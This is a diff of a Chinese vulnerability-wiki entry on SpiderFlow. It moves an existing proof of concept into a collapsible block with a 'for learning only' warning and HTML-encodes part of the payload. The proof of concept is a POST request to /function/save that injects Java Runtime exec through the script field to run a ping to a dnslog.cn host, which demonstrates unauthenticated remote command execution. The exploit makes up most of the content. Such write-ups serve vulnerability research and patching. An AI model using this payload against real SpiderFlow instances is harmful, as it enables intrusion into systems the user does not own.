@@ -37,11 +37,14 @@ title=="SpiderFlow"
 
 发送请求包执行命令
 
-```
-POST /function/save
+<details>
+<summary>POC 代码（点击展开 · 仅供学习，请勿用于非授权测试）</summary>
 
-id=&name=cmd&parameter=yw&script=}Java.type('java.lang.Runtime').getRuntime().exec('ping chwd71.dnslog.cn');{
-```
+<pre><code class="language-text">POST /function/save
+
+id=&amp;name=cmd&amp;parameter=yw&amp;script=}Java.type('java.lang.Runtime').getRuntime().&#101;xec('ping chwd71.dnslog.cn');{</code></pre>
+
+</details>
 
 ![image-20220524153448336](https://raw.githubusercontent.com/Threekiii/Vulnerability-Wiki/master/docs-base/docs/webapp/images/202205241534389.png)
 
